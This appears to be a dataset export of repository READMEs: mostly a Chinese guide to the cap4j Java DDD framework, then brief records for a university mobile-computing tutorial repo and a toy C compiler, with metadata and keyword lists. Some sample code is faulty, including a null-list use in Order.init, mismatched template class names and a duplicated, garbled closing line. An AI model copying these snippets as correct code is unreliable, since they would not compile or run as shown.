  `order_no` varchar(100) NOT NULL DEFAULT '' COMMENT '订单编号',
  `order_status` int unsigned NOT NULL DEFAULT '0' COMMENT '订单状态@T=OrderStatus;@E=0:INIT:待支付|1:PAID:已支付|-1:CLOSED:已关闭;',
  `amount` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT '总金额',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='订单\n';

CREATE TABLE `order_item` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint NOT NULL DEFAULT '0' COMMENT '关联主订单',
  `name` varchar(100) NOT NULL DEFAULT '' COMMENT '名称',
  `price` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT '单价',
  `count` int NOT NULL DEFAULT '0' COMMENT '数量',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='订单项\n @P=order';
# 以上sql语句隐含了如下实体映射关系：
# 订单表(order)对应实体是一个聚合根，并且订单项表(order_item)对应实体是order聚合的实体成员。
# 订单表(order)的订单状态字段(order_status)将会映射成OrderStatus的Java类型，该OrderStatus是一个enum类型，有3个字段成员，INIT、PAID、CLOSED
```
默认情况下，所有数据库表都将会映射成一个Java实体类，该实体类将构成一个聚合，并且作为该聚合的聚合根。如果聚合存在其他实体，则其他实体对应的表注释标注@P注解即可。

> @P指示该表对应的Java实体类属于某个聚合内的实体成员。
> 
> @E负责生成OrderStatus枚举。@E需要配合@T才能完成数据库字段的Java枚举映射。
> 
> @T负责将Order实体的orderStatus字段映射成OrderStatus枚举，@T可以单独工作，用于DB类型<->Java类型的强制自定义映射。
> 
> 如果想要对这套语法有个详细完整的了解，可以通过如下maven指令获取语法帮助。
> ```shell
> mvn io.github.netcorepal:cap4j-ddd-codegen-maven-plugin:1.0.0-alpha-1:help
> # or
> mvn cap4j-ddd-codegen:help
> ```
> 需要注意的是，当前`cap4j-ddd-codegen:gen-entity`仅支持基于MySQL数据库注释的注解解析。

先后执行
```shell
mvn cap4j-ddd-codegen:gen-entity
mvn cap4j-ddd-codegen:gen-repository
```
代码生成结果
```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * 订单
 *
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 * 警告：请勿手工修改该文件的字段声明，重新生成会覆盖字段声明
 */
/* @AggregateRoot */
@Entity
@Table(name = ""`order`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class Order {

    // 【行为方法开始】



    // 【行为方法结束】



    // 【字段映射开始】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * 订单编号
     * varchar(100)
     */
    @Column(name = ""`order_no`"")
    String orderNo;

    /**
     * 订单状态
     * 0:INIT:待支付;-1:CLOSED:已关闭;1:PAID:已支付
     * int unsigned
     */
    @Convert(converter = org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus.Converter.class)
    @Column(name = ""`order_status`"")
    org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus orderStatus;

    /**
     * 总金额
     * decimal(14,2)
     */
    @Column(name = ""`amount`"")
    java.math.BigDecimal amount;

    @OneToMany(cascade = { CascadeType.ALL }, fetch = FetchType.EAGER, orphanRemoval = true) @Fetch(FetchMode.SUBSELECT)
    @JoinColumn(name = ""`order_id`"", nullable = false)
    private java.util.List<org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem> orderItems;

    /**
     * 数据版本（支持乐观锁）
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // 【字段映射结束】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}

```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * 订单项
 *  
 *
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 * 警告：请勿手工修改该文件的字段声明，重新生成会覆盖字段声明
 */
@Entity
@Table(name = ""`order_item`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order_item` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class OrderItem {

    // 【行为方法开始】



    // 【行为方法结束】



    // 【字段映射开始】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * 名称
     * varchar(100)
     */
    @Column(name = ""`name`"")
    String name;

    /**
     * 单价
     * decimal(14,2)
     */
    @Column(name = ""`price`"")
    java.math.BigDecimal price;

    /**
     * 数量
     * int
     */
    @Column(name = ""`count`"")
    Integer count;

    /**
     * 数据版本（支持乐观锁）
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // 【字段映射结束】本段落由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}


```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.enums;

import lombok.Getter;

import javax.persistence.*;
import java.util.HashMap;
import java.util.Map;

/**
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 * 警告：请勿手工修改该文件，重新生成会覆盖该文件
 */
public enum OrderStatus {

    /**
     * 待支付
     */
    INIT(0, ""待支付""),
    /**
     * 已关闭
     */
    CLOSED(-1, ""已关闭""),
    /**
     * 已支付
     */
    PAID(1, ""已支付""),
;
    @Getter
    private int code;
    @Getter
    private String name;

    OrderStatus(Integer code, String name){
        this.code = code;
        this.name = name;
    }

    private static Map<Integer, OrderStatus> enums = null;
    public static OrderStatus valueOf(Integer code) {
        if(enums == null) {
            enums = new HashMap<>();
            for (OrderStatus val : OrderStatus.values()) {
                enums.put(val.code, val);
            }
        }
        if(enums.containsKey(code)){
            return enums.get(code);
        }
        throw new RuntimeException(""枚举类型OrderStatus枚举值转换异常，不存在的值"" + code);
    }

    /**
     * JPA转换器
     */
    public static class Converter implements AttributeConverter<OrderStatus, Integer>{
        @Override
        public Integer convertToDatabaseColumn(OrderStatus  val) {
            return val.code;
        }

        @Override
        public OrderStatus convertToEntityAttribute(Integer code) {
            return OrderStatus.valueOf(code);
        }
    }
}


```

```java
package org.netcorepal.cap4j.ddd.example.adapter.domain.repositories;

import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;

/**
 * 本文件由[cap4j-ddd-codegen-maven-plugin]生成
 */
public interface OrderRepository extends org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository<Order, Long> {
    // 【自定义代码开始】本段落之外代码由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动

    @org.springframework.stereotype.Component
    public static class OrderJpaRepositoryAdapter extends org.netcorepal.cap4j.ddd.domain.repo.AbstractJpaRepository<Order, Long>
    {
        public OrderJpaRepositoryAdapter(org.springframework.data.jpa.repository.JpaSpecificationExecutor<Order> jpaSpecificationExecutor, org.springframework.data.jpa.repository.JpaRepository<Order, Long> jpaRepository) {
            super(jpaSpecificationExecutor, jpaRepository);
        }
    }

    // 【自定义代码结束】本段落之外代码由[cap4j-ddd-codegen-maven-plugin]维护，请不要手工改动
}

```

##### UniOfWork模式
简单来说[UoW](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/june/the-unit-of-work-pattern-and-persistence-ignorance)实现了将当前线程上下文中所有实体的变更操作一并转化成对应的关系型数据库的持久化DML（insert、update、delete）的能力。缩短事务执行时间的同时，可以让我们将更多的精力放在业务逻辑实现和优化上。

UnitOfWork 常用接口
- `persist(Object entity)` 待持久化添加或更新
- `remove(Object entity)` 待持久化删除
- `save()` 以整体事务提交以上待持久化的变更(添加、更新或删除)

示例
```java
// 代码省略...
public class Order {

    // 【行为方法开始】

    /**
     * 下单初始化
     * @param items
     */
    public void init(List<OrderItem> items){
        this.orderNo = ""order-"" + System.currentTimeMillis();
        this.orderStatus = OrderStatus.INIT;
        BigDecimal amount = orderItems.stream()
                .map(i -> i.getPrice().multiply(BigDecimal.valueOf( i.getCount())))
                .reduce(BigDecimal.ZERO, (a,b) -> a.add(b));
        this.amount = amount;
        this.orderItems = items;
    }

    // 【行为方法结束】
    // 代码省略...
}
```

```java
package org.netcorepal.cap4j.ddd.example.application.commands;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.command.Command;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.UnitOfWork;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem;
import org.springframework.stereotype.Service;

import java.math.BigDecimal;
import java.util.List;
import java.util.stream.Collectors;


/**
 * 下单
 *
 * @date 2024/8/21
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class PlaceOrderCmd {

    @Schema(description = ""订单项列表"")
    List<Item> orderItems;


    @Schema(description = ""订单项"")
    public static class Item{

        @Schema(description = ""名称"")
        String name;

        @Schema(description = ""价格"")
        BigDecimal price;

        @Schema(description = ""数量"")
        Integer count;
    }

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<PlaceOrderCmd, String> {
        private final AggregateRepository<Order, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public String exec(PlaceOrderCmd cmd) {

            Order order = Order.builder().build();

            List<OrderItem> orderItems = cmd.orderItems.stream()
                    .map(i -> OrderItem.builder()
                            .name(i.name)
                            .price(i.price)
                            .count(i.count)
                            .build())
                    .collect(Collectors.toList());

            order.init(orderItems);

            unitOfWork.persist(order);
            unitOfWork.save();

            return order.getOrderNo();
        }
    }
}
```

##### 事件定义、订阅、发布
**创建发件箱表**

为了实现`Outbox`模式，cap4j需要在业务库中创建发件箱表。脚手架初始化后，项目内`resources/ddl.sql`包含完整的发件箱表建表语句
```sql
-- Create syntax for TABLE '__event'
CREATE TABLE `__event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT '事件uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT '服务',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件类型',
                           `data` text COMMENT '事件数据',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件数据类型',
                           `exception` text COMMENT '事件发送异常',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '过期时间',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT '分发状态',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次尝试时间',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT '下次尝试时间',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT '已尝试次数',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT '尝试次数',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='事件发件箱 support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;
-- Create syntax for TABLE '__achrived_event'
CREATE TABLE `__achrived_event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT '事件uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT '服务',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件类型',
                           `data` text COMMENT '事件数据',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT '事件数据类型',
                           `exception` text COMMENT '事件发送异常',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '过期时间',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT '分发状态',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次尝试时间',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT '下次尝试时间',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT '已尝试次数',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT '尝试次数',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='事件发件箱存档 support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;

CREATE TABLE `__locker` (
                            `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                            `name` varchar(100) NOT NULL DEFAULT '' COMMENT '锁名称',
                            `pwd` varchar(100) NOT NULL DEFAULT '' COMMENT '锁密码',
                            `lock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT '锁获取时间',
                            `unlock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT '锁释放时间',
                            `version` bigint(20) unsigned NOT NULL DEFAULT '0',
                            `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
                            `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP  COMMENT '更新时间',
                            PRIMARY KEY (`id`),
                            KEY `idx_db_created_at` (`db_created_at`),
                            KEY `idx_db_updated_at` (`db_updated_at`),
                            UNIQUE `uniq_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='锁 support by cap4j\n@I;';

```

**领域事件定义**

通常领域事件发布需配合`UnitOfWork`模式实现，这指的是领域事件的发布与聚合内实体属性状态变更的持久化是捆绑的（归属同一事务），所以更合理的做法是领域事件一般定义在领域层（`domain`)。

通过[`DomainEvent`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/annotation/DomainEvent.java)注解的类，cap4j将会识别成领域事件。
后续即可通过[`DefaultDomainEventSupervisor`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/impl/DefaultDomainEventSupervisor.java).`instance`.`attach`方法来向当前线程上线文附加领域事件。
一旦 [`UnitOfWork`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/repo/UnitOfWork.java).save() 顺利提交事务。则cap4j将会保障事件被提交到具体适配好的消息队列（比如当前cap4j实现的RocketMQ）中。

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.events;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.netcorepal.cap4j.ddd.domain.event.annotation.DomainEvent;

import java.math.BigDecimal;
import java.time.LocalDateTime;

/**
 * 下单领域事件
 *
 * @author bingking338
 */
@DomainEvent(
        persist = true
)
@Data
@AllArgsConstructor
@NoArgsConstructor
@Builder
public class OrderPlacedDomainEvent {
    /**
     * 订单号
     */
    String orderNo;
    /**
     * 订单金额
     */
    BigDecimal amount;
    /**
     * 下单时间
     */
    LocalDateTime orderTime;
}

```
> 注解属性详解
> - `value()` value字段非空，则事件会被识别为集成事件，意味着该事件将通过消息队列适配，通知到分布式系统中的其他服务进程。
> - `subscriber()` 集成事件订阅场景，必须定义该字段，通常该字段的值将会被适配的消息队列应用到消费分组配置中。
> - `persist()` 控制事件发布记录持久化。集成事件发布场景，该字段无意义。非集成事件发布场景（仅在本服务进程内部有订阅需求），可以通过`persist=true`控制事件进入发件箱表，并脱离事件发布上下文事务中。以避免订阅逻辑异常影响发布事务的完成。
> 
> 应用场景例子说明
> - `基于MQ发送方` DomainEvent(value=""event-name-used-for-mq-topic"")
> - `基于MQ订阅方` DomainEvent(subscriber=""consumer-group"")
> - `消费方与订阅方事务隔离` DomainEvent(persist=true)
> - `消费方与订阅方同一事务` DomainEvent
> 
> 关于领域事件与集成事件
> 
> 集成事件指会对系统内其他服务发布的领域事件。通常如果要区分领域事件和集成事件，那么领域事件一般指的是不需要对外发布的业务事件，仅在内部聚合之间应用。很多地方都不区分领域事件与集成事件，但是我认为这个区分是价值的。
>


**领域事件发布**

通常应在实体行为中，发布领域事件。

接口[DomainEventSupervisor.java](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/DomainEventSupervisor.java)
> `即时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity)
> 
> `延时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, Duration delay)
> 
> `定时发送` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, LocalDateTime schedule)

```java
import org.netcorepal.cap4j.ddd.domain.event.impl.DefaultDomainEventSupervisor;


// 代码省略...
public class Order {
    // 代码省略...
    public class Order {

        // 【行为方法开始】

        /**
         * 下单初始化
         * @param items
         */
        public void init(List<OrderItem> items){
            // 代码省略...
            DefaultDomainEventSupervisor.instance.attach(OrderPlacedDomainEvent.builder()
                    .orderNo(this.orderNo)
                    .amount(this.amount)
                    .orderTime(LocalDateTime.now())
                    .build(), this);
        }

        // 【行为方法结束】
        // 代码省略...
    }
}
```

**领域事件订阅**

领域事件订阅定义在应用层（`application`），通常放置在 `${basePackage}.application.subscribers` 包中。

领域事件订阅支持Spring注解式声明订阅(监听)的方式。

```java

import org.springframework.context.event.EventListener;
import org.springframework.stereotype.Service;

@Service
public class OrderPlacedDomainEventSubscriber{
    @EventListener(DeliveryReceivedDomainEvent.class)
    public void onEvent(DeliveryReceivedDomainEvent event){
        // 事件处理逻辑
    }
}
```


#### 应用层
##### IDEA代码模板
`${basePackage}.application.commands`中的类模板

模板名称：`Command`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 命令描述
 * 
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<${NAME}, ${ReturnType}>{
        private final AggregateRepository<${Entity}, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public ${ReturnType} exec(${NAME} cmd) {
            
            return null;
        }
    }
}
```
`${basePackage}.application.queries`中的类模板

模板名称：`Query`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.Query;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Query<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public ${NAME}Dto exec(${NAME} param) {
            ${Entity} entity = repo.findOne(${Entity}Schema.specify(
                root -> root.id().eq(param.id)
            )).orElseThrow(() -> new KnownException(""不存在""));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

模板名称：`QueryList`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.ListQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements ListQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public List<${NAME}Dto> exec(${NAME} param) {
            List<${Entity}> list = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

模板名称：`QueryPage`
```java
#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.PageQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.JpaPageUtils;
import org.netcorepal.cap4j.ddd.share.PageData;
import org.netcorepal.cap4j.ddd.share.PageParam;
import org.springframework.data.domain.Page;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: 查询描述
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class ${NAME} extends PageParam {
    private Long id;

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements PageQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;
    
        @Override
        public PageData<${NAME}Dto> exec(${NAME} param) {
            Page<${Entity}> page = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ), JpaPageUtils.toSpringData(param));
    
            return JpaPageUtils.fromSpringData(page, p -> UserPageDto.builder()
                .id(p.getId())
                .build());
        }
    }
    
    @Data
    @Builder
    @AllArgsConstructor
    @NoArgsConstructor
    public static class ${NAME}Dto{
        private Long id;
    
    }
}
```


#### 适配层
##### IDEA LiveTemplate
`acmd` 适配mvc透出命令
```java

@Autowired
$Cmd$.Handler $cmd$Handler;

@Data
@NoArgsConstructor
public static class $Cmd$Request {
    // todo: 添加参数

    @Schema(description = ""参数说明"")
    String param;

    public DeductWalletCmd toCommand() {
        return $Cmd$.builder()
                .param(param)
                .build();
    }
}
@Schema(description = ""接口说明"")
@PostMapping(""/$cmd$"")
public ResponseData<$ReturnType$> $cmd$(@RequestBody @Valid $Cmd$Request request) {
    $ReturnType$ result = $cmd$Handler.exec(request.toCommand());
    return ResponseData.success(result);
}
```
> Edit Template Variables 技巧
>
> cmd参数的Expression可以填入decapitalize(Cmd)

`aqry` 适配mvc透出查询详情
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@GetMapping(""/$qry$"")
public ResponseData<$Qry$.$Qry$Dto> $qry$(@Valid $Qry$ param) {
        $Qry$.$Qry$Dto result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryl` 适配mvc透出查询列表
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@GetMapping(""/$qry$"")
public ResponseData<List<$Qry$.$Qry$Dto>> $qry$(@Valid $Qry$ param) {
        List<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryp` 适配mvc透出查询分页列表
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""接口说明"")
@PostMapping(""/$qry$"")
public ResponseData<PageData<$Qry$.$Qry$Dto>> $qry$(@RequestBody @Valid $Qry$ param) {
        PageData<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }esponseData.success(result);
        }
```
### have a nice trip!",1,10,4,9.0,"['order', 'order', 'partition', 'range', 'partition', 'value', 'less', 'partition', 'range', 'partition', 'value', 'less', 'idea', 'livetemplate', 'nice', 'trip']","['partition', 'order', 'range', 'value', 'less']"
UniMelb-COMP90018/COMP90018-Tutorials-2024,master,"## Mobile Computing Systems Programming (COMP90018)
This repository is created for archiving **Mobile Computing Systems Programming** *Tutorial source code (2024 version)* from the University of Melbourne.

### License
See the [LICENSE file](./LICENSE) for license rights and limitations (MIT).

### Installation
The example projects were developed with Android 13 / API 33 using Android Studio.
",0,0,1,0.0,"['mobile', 'compute', 'system', 'programming', 'license', 'installation']","['mobile', 'compute', 'system', 'programming', 'license']"
minecraft8997/TennessineC,master,"![TennessineC logotype](misc/logotype.png)

# TennessineC
A small C compiler, written in pure Java, which is able to craft i386 Windows executables.

Currently, supports basic FFI (via `#pragma tenc import` directives), variables, functions (still WIP though), ""while""
loops, ""if"" statements, expressions containing braces, variables, function calls, constants and summation, subtraction
operators. The sole data type currently supported is `int` (32-bit word).

Note that at this moment I don't plan to strictly follow any of currently existing C standards, so this will probably
remain a toy compiler.

## Obtaining a pre-built binary
Please navigate to [Releases](https://github.com/minecraft8997/TennessineC/releases) section.

## Compiling [`examples/test.c`](https://github.com/minecraft8997/TennessineC/blob/master/examples/test.c)

Use the following command: `java -jar TennessineC.jar -s examples/test.c -dp -e WinI386 -o test.exe`
(-dp stands for Debug Preprocessor)

The compiler should craft the `test.exe` file.

## Building
Step 1. Ensure you have JDK 8 (or above) installed;

Step 2. Clone the repository: `git clone https://github.com/minecraft8997/TennessineC`;

Step 3. Import the project into IntelliJ IDEA;

Step 4. Navigate to File -> Project Structure -> Artifacts -> Add -> JAR -> From modules with dependencies...

Step 5. Select the main class `ru.deewend.tennessinec.TennessineC`, press OK;

Step 6. Press Apply;

Step 7. Navigate to Build -> Build Artifacts... -> TennessineC:jar -> Build;

Step 8. Your jarfile will be located in the `out/artifacts/TennessineC_jar` folder.

## What I use for development

I was inspired to start this project after checking out the documentation which fits into a single PNG image –
[PE101](https://github.com/corkami/pics/tree/master/binary/pe101).

Currently, for development I use [Tiny C Compiler](https://bellard.org/tcc/) to compile test snippets and
